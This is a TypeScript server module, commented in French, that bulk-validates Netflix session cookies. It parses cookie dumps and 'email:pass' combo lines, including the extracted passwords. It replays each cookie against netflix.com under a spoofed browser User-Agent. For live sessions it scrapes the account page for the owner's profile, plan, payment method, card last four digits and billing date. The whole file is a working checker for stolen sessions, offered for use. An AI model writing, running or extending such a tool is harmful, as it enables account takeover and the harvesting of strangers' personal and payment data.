/**
 * Service côté serveur pour valider les cookies Netflix
 * Reproduit fidèlement la logique de netflix_cookie_checker.py + batch_cookie_checker.py
 */

import * as url from "node:url";

export interface CookieEntry {
  domain: string;
  flag: string;
  path: string;
  secure: boolean;
  expiry: string;
  name: string;
  value: string;
}

export interface CookieBatch {
  index: number;
  cookies: CookieEntry[];
  rawLine: string;
  sourceFile?: string;
  accountInfo?: Record<string, string>;
}

export interface AccountInfo {
  profileName?: string;
  memberSince?: string;
  countryOfSignup?: string;
  videoQuality?: string;
  planName?: string;
  maxStreams?: number;
  planPrice?: string;
  paymentMethod?: string;
  last4Digit?: string;
  paymentType?: string;
  nextBillingDate?: string;
  membershipStatus?: string;
  hasExtraSlot?: boolean;
  accountStatus?: string;
  final_url?: string;
  [key: string]: unknown;
}

export interface ValidationResult {
  batchIndex: number;
  isValid: boolean;
  message: string;
  netflixId: string | null;
  cookiesData: CookieEntry[];
  accountInfo: AccountInfo;
  netscapeFormat: string;
}

// --- Parsing ---

export function parseCookieString(cookieStr: string): CookieEntry[] {
  const cookies: CookieEntry[] = [];
  for (const part of cookieStr.split(";")) {
    const trimmed = part.trim();
    if (trimmed.includes("=")) {
      const [name, ...rest] = trimmed.split("=");
      const value = rest.join("=");
      cookies.push({
        domain: ".netflix.com",
        flag: "TRUE",
        path: "/",
        secure: true,
        expiry: "0",
        name: name.trim(),
        value: value.trim(),
      });
    }
  }
  return cookies;
}

export function parseNetscapeCookie(line: string): CookieEntry | null {
  const parts = line.split("\t");
  if (parts.length < 7) return null;

  return {
    domain: parts[0],
    flag: parts[1],
    path: parts[2],
    secure: parts[3].toUpperCase() === "TRUE",
    expiry: parts[4],
    name: parts[5],
    value: parts[6],
  };
}

export function extractAllCookies(cookieLine: string): CookieEntry[] {
  const cookies: CookieEntry[] = [];
  const parts = cookieLine.trim().split("\t");

  if (parts.length >= 7) {
    let i = 0;
    while (i < parts.length - 6) {
      try {
        const cookie: CookieEntry = {
          domain: parts[i],
          flag: parts[i + 1],
          path: parts[i + 2],
          secure: parts[i + 3].toUpperCase() === "TRUE",
          expiry: parts[i + 4],
          name: parts[i + 5],
          value: parts[i + 6],
        };
        cookies.push(cookie);
        i += 7;
      } catch {
        i += 1;
      }
    }
  }

  return cookies;
}

function parseCookiesFromFileContent(content: string): CookieEntry[] {
  const lines = content
    .replace(/\r/g, "")
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line && !line.startsWith("#"));

  if (lines.length === 0) {
    return [];
  }

  // Format with original cookies block: parse the next line after the marker.
  const originalIndex = lines.findIndex((line) => line.includes("# Original cookies block:"));
  if (originalIndex !== -1 && originalIndex + 1 < lines.length) {
    return parseCookieString(lines[originalIndex + 1]);
  }

  const cookies: CookieEntry[] = [];

  // Standard Netscape lines: collect all valid cookie entries in the file.
  for (const line of lines) {
    const extracted = extractAllCookies(line);
    if (extracted.length > 0) {
      cookies.push(...extracted);
    }
  }

  if (cookies.length > 0) {
    return cookies;
  }

  // If no Netscape cookies were found, search for a single NetflixId-style line.
  for (const line of lines) {
    const nfMatch = line.match(/^NetflixId=([^|]+)/);
    if (nfMatch) {
      let netflixValue = nfMatch[1].trim();
      if (netflixValue.endsWith(".")) {
        netflixValue = netflixValue.slice(0, -1);
      }

      return [
        {
          domain: ".netflix.com",
          flag: "TRUE",
          path: "/",
          secure: true,
          expiry: "0",
          name: "NetflixId",
          value: netflixValue,
        },
      ];
    }

    const ncMatch = line.match(/NetflixCookies\s*=\s*NetflixId=([^|\n]+)/);
    if (ncMatch) {
      let netflixValue = ncMatch[1].trim();
      if (netflixValue.endsWith(".")) {
        netflixValue = netflixValue.slice(0, -1);
      }

      return [
        {
          domain: ".netflix.com",
          flag: "TRUE",
          path: "/",
          secure: true,
          expiry: "0",
          name: "NetflixId",
          value: netflixValue,
        },
      ];
    }
  }

  return [];
}

export function parseCookiesFromText(content: string): CookieBatch[] {
  const batches: CookieBatch[] = [];
  const lines = content.replace(/\r/g, "").split("\n");

  const fileGroups: Array<{
    sourceFile?: string;
    rawLine: string;
    lines: string[];
  }> = [];

  let currentGroup: { sourceFile?: string; rawLine: string; lines: string[] } | null = null;

  for (const rawLine of lines) {
    const trimmed = rawLine.trim();
    const headerMatch = trimmed.match(/^# ---\s*(.+?)\s*---$/);
    if (headerMatch) {
      if (currentGroup) {
        fileGroups.push(currentGroup);
      }
      currentGroup = {
        sourceFile: headerMatch[1],
        rawLine: headerMatch[1],
        lines: [],
      };
      continue;
    }

    if (currentGroup) {
      currentGroup.lines.push(rawLine);
      continue;
    }

    if (trimmed) {
      if (fileGroups.length === 0 || fileGroups[fileGroups.length - 1].sourceFile) {
        fileGroups.push({ sourceFile: undefined, rawLine: trimmed.substring(0, 100), lines: [rawLine] });
      } else {
        fileGroups[fileGroups.length - 1].lines.push(rawLine);
      }
    }
  }

  if (currentGroup) {
    fileGroups.push(currentGroup);
  }

  const hasFileMarkers = fileGroups.some((group) => group.sourceFile !== undefined);

  if (hasFileMarkers) {
    for (const group of fileGroups) {
      const cookies = parseCookiesFromFileContent(group.lines.join("\n"));
      if (cookies.length > 0) {
        batches.push({
          index: batches.length + 1,
          cookies,
          rawLine: group.sourceFile || group.rawLine,
          sourceFile: group.sourceFile,
        });
      }
    }
    return batches;
  }

  for (let lineIdx = 0; lineIdx < lines.length; lineIdx++) {
    const line = lines[lineIdx].trim();

    if (!line || line.startsWith("#")) continue;

    // Strategy 1: Standard Netscape tab-separated lines
    const cookies = extractAllCookies(line);
    if (cookies.length > 0) {
      batches.push({
        index: batches.length + 1,
        cookies,
        rawLine: line.substring(0, 100) + (line.length > 100 ? "..." : ""),
      });
      continue;
    }

    // Strategy 1b: Raw cookie header with name=value pairs separated by semicolons
    const rawCookies = parseCookieString(line);
    if (rawCookies.length > 0) {
      batches.push({
        index: batches.length + 1,
        cookies: rawCookies,
        rawLine: line.substring(0, 100) + (line.length > 100 ? "..." : ""),
      });
      continue;
    }

    // Strategy 2: Format "NetflixId=... | Email: ... | Plan: ..."
    const nfMatch = line.match(/^NetflixId=([^|]+)/);
    if (nfMatch) {
      let netflixValue = nfMatch[1].trim();
      if (netflixValue.endsWith(".")) {
        netflixValue = netflixValue.slice(0, -1);
      }

      const cookie: CookieEntry = {
        domain: ".netflix.com",
        flag: "TRUE",
        path: "/",
        secure: true,
        expiry: "0",
        name: "NetflixId",
        value: netflixValue,
      };

      const accountInfo: Record<string, string> = {};
      const parts = line.split("|").map((p) => p.trim());
      for (const seg of parts) {
        if (seg.includes("=")) {
          const [k, ...v] = seg.split("=");
          accountInfo[k.trim()] = v.join("=").trim();
        }
      }

      batches.push({
        index: batches.length + 1,
        cookies: [cookie],
        rawLine: line.substring(0, 100) + (line.length > 100 ? "..." : ""),
        accountInfo,
      });
      continue;
    }

    // Strategy 3: Format "email:pass | ... | NetflixCookies = NetflixId=..."
    const ncMatch = line.match(/NetflixCookies\s*=\s*NetflixId=([^|\n]+)/);
    if (ncMatch) {
      let netflixValue = ncMatch[1].trim();
      if (netflixValue.endsWith(".")) {
        netflixValue = netflixValue.slice(0, -1);
      }

      const cookie: CookieEntry = {
        domain: ".netflix.com",
        flag: "TRUE",
        path: "/",
        secure: true,
        expiry: "0",
        name: "NetflixId",
        value: netflixValue,
      };

      const accountInfo: Record<string, string> = {};
      const parts = line.split("|").map((p) => p.trim());
      if (parts[0] && parts[0].includes(":")) {
        const [email, pwd] = parts[0].split(":", 2);
        accountInfo["email"] = email.trim();
        accountInfo["password"] = pwd?.trim() || "";
      }
      for (const seg of parts.slice(1)) {
        if (seg.includes("=")) {
          const [k, ...v] = seg.split("=");
          accountInfo[k.trim()] = v.join("=").trim();
        }
      }

      batches.push({
        index: batches.length + 1,
        cookies: [cookie],
        rawLine: line.substring(0, 100) + (line.length > 100 ? "..." : ""),
        accountInfo,
      });
      continue;
    }
  }

  return batches;
}

// --- Validation (reproduit exactement netflix_cookie_checker.py) ---

/**
 * Decode \xNN and \uNNNN escape sequences in strings from Netflix HTML
 */
function decodeUnicodeEscapes(str: string): string {
  if (!str) return str;
  let result = str.replace(/\\x([0-9A-Fa-f]{2})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16))
  );
  result = result.replace(/\\u([0-9A-Fa-f]{4})/g, (_, hex) =>
    String.fromCharCode(parseInt(hex, 16))
  );
  return result;
}

/**
 * Decode le cookie NetflixId et extrait les parametres
 */
function decodeNetflixId(netflixId: string): Record<string, string> {
  const decoded = decodeURIComponent(netflixId);
  const params: Record<string, string> = {};
  const pairs = decoded.split("&");
  for (const pair of pairs) {
    if (pair.includes("=")) {
      const [key, ...rest] = pair.split("=");
      params[key] = rest.join("=");
    }
  }
  return params;
}

/**
 * Valide la structure du cookie NetflixId
 */
function validateCookieStructure(
  params: Record<string, string>
): { valid: boolean; message: string } {
  // Champs requis: v et ct
  if (!params["v"]) return { valid: false, message: "Champ manquant: v" };
  if (!params["ct"]) return { valid: false, message: "Champ manquant: ct" };

  // Version doit etre 3
  if (params["v"] !== "3") {
    return { valid: false, message: `Version non supportée: ${params["v"]}` };
  }

  // ct ne doit pas etre vide
  if (!params["ct"].trim()) {
    return { valid: false, message: "Cookie token (ct) vide" };
  }

  return { valid: true, message: "Structure valide" };
}

/**
 * Teste la validite du cookie en faisant une requete a Netflix
 * Reproduit exactement test_cookie_validity de netflix_cookie_checker.py
 */
async function testCookieValidity(
  cookies: CookieEntry[]
): Promise<{ isValid: boolean; message: string; extraInfo: AccountInfo }> {
  const cookieHeader = cookies.map((c) => `${c.name}=${c.value}`).join("; ");

  const headers: Record<string, string> = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    Accept:
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Sec-Ch-Ua": '"Chromium";v="135", "Not-A.Brand";v="8"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "none",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    Cookie: cookieHeader,
  };

  try {
    // Step 1: Test avec la page principale Netflix (comme le script Python)
    const response = await fetch("https://www.netflix.com/", {
      headers,
      redirect: "follow",
    });

    const extraInfo: AccountInfo = {};
    const finalUrl = response.url;

    if (response.status === 200) {
      // Verifier si on est redirige vers login
      if (finalUrl.toLowerCase().includes("login")) {
        return {
          isValid: false,
          message: "Cookie invalide - Redirection vers login",
          extraInfo: { accountStatus: "Invalid", final_url: finalUrl },
        };
      }

      if (!isBrowseUrl(finalUrl)) {
        return {
          isValid: false,
          message: "Cookie invalide - Lien final non /browse",
          extraInfo: { accountStatus: "Invalid", final_url: finalUrl },
        };
      }

      // Cookie valide - aller chercher les infos du compte
      let isValid = true;
      extraInfo.accountStatus = "Active";
      extraInfo.final_url = finalUrl;

      // Step 2: Recuperer les infos du compte depuis /account
      try {
        const accountResp = await fetch("https://www.netflix.com/account", {
          headers,
          redirect: "follow",
        });

        if (accountResp.status === 200) {
          const html = await accountResp.text();
          parseAccountHtml(html, extraInfo);
        }
      } catch {
        // Pas grave si on ne peut pas recuperer les infos du compte
      }

      return {
        isValid,
        message: "Cookie valide - Acces autorise",
        extraInfo,
      };
    } else if (response.status === 302 || response.status === 301) {
      const location = response.headers.get("location") || "";
      if (location.toLowerCase().includes("login")) {
        return {
          isValid: false,
          message: "Cookie expire - Redirection vers login",
          extraInfo: { accountStatus: "Expired", final_url: location },
        };
      }

      if (!isBrowseUrl(location)) {
        return {
          isValid: false,
          message: "Cookie invalide - Lien final non /browse",
          extraInfo: { accountStatus: "Invalid", final_url: location },
        };
      }

      return {
        isValid: true,
        message: "Cookie valide - Acces autorise",
        extraInfo: { accountStatus: "Active", final_url: location },
      };
    } else if (response.status === 421) {
      return {
        isValid: false,
        message: "Cookie invalide - Requete mal dirigee",
        extraInfo: { accountStatus: "Invalid", final_url: finalUrl },
      };
    } else {
      return {
        isValid: false,
        message: `Statut inattendu: ${response.status}`,
        extraInfo: { accountStatus: "Unknown" },
      };
    }
  } catch (error) {
    const msg = error instanceof Error ? error.message : "Erreur inconnue";
    return {
      isValid: false,
      message: `Erreur de connexion: ${msg}`,
      extraInfo: {},
    };
  }
}

/**
 * Parse le HTML de la page /account pour extraire les infos
 * Reproduit exactement les regex de netflix_cookie_checker.py
 */
function parseAccountHtml(html: string, info: AccountInfo): void {
  let match: RegExpMatchArray | null;

  // profileName
  match = html.match(/"profileName":"([^"]+)"/);
  if (match) {
    info.profileName = decodeUnicodeEscapes(match[1]);
  }

  // memberSince
  match = html.match(
    /"memberSince":\{"fieldType":"Numeric","value":(\d+)\}/
  );
  if (match) {
    const timestamp = parseInt(match[1]) / 1000;
    const date = new Date(timestamp * 1000);
    info.memberSince = date.toISOString().split("T")[0];
  }

  // countryOfSignup
  match = html.match(/"countryOfSignup":"([^"]+)"/);
  if (match) {
    info.countryOfSignup = match[1];
  }

  // videoQuality
  match = html.match(
    /"videoQuality":\{"fieldType":"String","value":"([^"]+)"\}/
  );
  if (match) {
    info.videoQuality = match[1];
  }

  // localizedPlanName
  match = html.match(
    /"localizedPlanName":\{"fieldType":"String","value":"([^"]+)"\}/
  );
  if (match) {
    const planName = decodeUnicodeEscapes(match[1]);
    if (info.videoQuality) {
      info.planName = `${planName} ${info.videoQuality}`;
    } else {
      info.planName = planName;
    }
  }

  // maxStreams
  match = html.match(
    /"maxStreams":\{"fieldType":"Numeric","value":(\d+)\}/
  );
  if (match) {
    info.maxStreams = parseInt(match[1]);
  }

  // planPrice
  match = html.match(
    /"planPrice":\{"fieldType":"String","value":"([^"]+)"\}/
  );
  if (match) {
    let pp = decodeUnicodeEscapes(match[1]);
    try { pp = decodeURIComponent(pp); } catch {}
    info.planPrice = pp;
  }

  // paymentMethod
  match = html.match(
    /"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\}/
  );
  if (match) {
    info.paymentMethod = match[1];
  }

  // last4Digit
  match = html.match(
    /"paymentMethod":\{"fieldType":"String","value":"([^"]+)"\},"displayText":\{"fieldType":"String","value":"[^"]*([0-9]{4})"\}/
  );
  if (match) {
    info.last4Digit = match[2];
  }

  // paymentType via paymentOptionLogo
  const logoMatches = html.match(/"paymentOptionLogo":"([^"]+)"\}\}\]/g);
  if (logoMatches && info.last4Digit) {
    const lastLogo = logoMatches[logoMatches.length - 1];
    const logoMatch = lastLogo.match(/"paymentOptionLogo":"([^"]+)"/);
    if (logoMatch) {
      info.paymentType = `${logoMatch[1]} - ${info.last4Digit}`;
    }
  }

  // nextBillingDate
  match = html.match(
    /nextBillingDate":\{"fieldType":"String","value":"([^"]+)"\}/
  );
  if (match) {
    info.nextBillingDate = decodeUnicodeEscapes(match[1]);
  }

  // membershipStatus
  match = html.match(
    /"membershipStatus":\{"fieldType":"String","value":"([^"]+)"\}/
  );
  if (match) {
    info.membershipStatus = match[1];
  }

  // hasExtraSlot
  match = html.match(
    /"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)\}/
  );
  if (match) {
    info.hasExtraSlot = match[1] === "true";
  }

  // accountStatus
  if (html.includes('"isActiveOrOnHold":true,')) {
    info.accountStatus = "Active";
  } else if (html.includes('"isActiveOrOnHold":false,')) {
    info.accountStatus = "On Hold";
  }
}

function isBrowseUrl(urlValue: string): boolean {
  try {
    const normalized = new URL(urlValue, "https://www.netflix.com");
    return (
      normalized.protocol === "https:"
      && normalized.hostname === "www.netflix.com"
      && normalized.pathname.replace(/\/+$/, "") === "/browse"
    );
  } catch {
    return false;
  }
}

/**
 * Valide un batch de cookies - reproduit test_single_cookie_batch
 */
export async function validateCookieBatch(
  batch: CookieBatch
): Promise<ValidationResult> {
  // Chercher NetflixId
  const netflixIdCookie = batch.cookies.find((c) => c.name === "NetflixId");

  if (!netflixIdCookie) {
    return {
      batchIndex: batch.index,
      isValid: false,
      message: "Cookie NetflixId non trouve",
      netflixId: null,
      cookiesData: batch.cookies,
      accountInfo: {},
      netscapeFormat: formatBatchNetscape(batch.cookies),
    };
  }

  const netflixId = netflixIdCookie.value;

  // Decoder et valider la structure
  const params = decodeNetflixId(netflixId);
  const structureCheck = validateCookieStructure(params);

  if (!structureCheck.valid) {
    return {
      batchIndex: batch.index,
      isValid: false,
      message: `Structure invalide: ${structureCheck.message}`,
      netflixId,
      cookiesData: batch.cookies,
      accountInfo: {},
      netscapeFormat: formatBatchNetscape(batch.cookies),
    };
  }

  // Tester en ligne
  const { isValid, message, extraInfo } = await testCookieValidity(
    batch.cookies
  );

  return {
    batchIndex: batch.index,
    isValid,
    message,
    netflixId,
    cookiesData: batch.cookies,
    accountInfo: extraInfo,
    netscapeFormat: formatBatchNetscape(batch.cookies),
  };
}

// --- Formatting ---

export function formatCookieNetscape(cookie: CookieEntry): string {
  const secure = cookie.secure ? "TRUE" : "FALSE";
  return `${cookie.domain}\t${cookie.flag}\t${cookie.path}\t${secure}\t${cookie.expiry}\t${cookie.name}\t${cookie.value}`;
}

export function formatBatchNetscape(cookies: CookieEntry[]): string {
  return cookies.map(formatCookieNetscape).join("\n");
}

// --- Translation ---

export function translatePlan(text: string | null): string {
  if (!text) return "N/A";

  const translations: Record<string, string> = {
    "with ads": "avec pubs",
    "without ads": "sans pubs",
    "com anuncios": "avec pubs",
    "sem anuncios": "sans pubs",
    "cu reclame": "avec pubs",
    padrao: "Standard",
    standard: "Standard",
    premium: "Premium",
    basic: "Basique",
  };

  let result = text;
  const lower = text.toLowerCase();
  for (const [eng, fr] of Object.entries(translations)) {
    if (lower.includes(eng)) {
      result = result.replace(new RegExp(eng, "gi"), fr);
    }
  }
  return result;
}
